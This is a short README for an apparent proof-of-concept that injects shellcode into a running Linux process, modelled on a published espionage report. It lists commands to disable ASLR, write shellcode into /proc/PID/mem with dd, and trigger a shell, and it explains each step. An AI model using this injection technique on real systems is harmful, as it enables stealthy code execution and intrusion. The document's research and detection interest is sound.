# straycat scaffolding

Playing around with process injection as per <https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-targets-juniper-routers>

Scaffolding done on `Linux vagrant 5.15.0-87-generic #97-Ubuntu SMP Tue Oct 3 09:52:42 UTC 2023 aarch64 aarch64 aarch64 GNU/Linux`.

## Usage

```sh
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space # if needed
gcc -o find_got find_got.c
rm -f /tmp/null
mkfifo /tmp/null
cat /tmp/null
# on another terminal run
chmod +x straycat.sh
sudo ./straycat.sh $(pidof cat)
# vagrant@vagrant:~$ cat /tmp/null
# $ id
# uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

## How it works

1. A named pipe `/tmp/null` is created using `mkfifo`.
2. Then a hanging read on the named pipe using `cat /tmp/null` is executed.
3. Then run `straycat.sh` with the PID of the `cat` process as an argument.
4. Shellcode from <https://github.com/maxcompston/arm64_shellcode/blob/master/shell-code-mapped/sc_mapped.c>
5. We calculate the entrypoint and then the GOT address of `cat`.
6. We inject the shellcode into the `cat` process using `dd` at `/proc/$PID/mem`.
7. We trigger the shellcode by sending EOF to the pipe with `echo >/tmp/null`.

## TODO

- [ ] Detect the attempt?
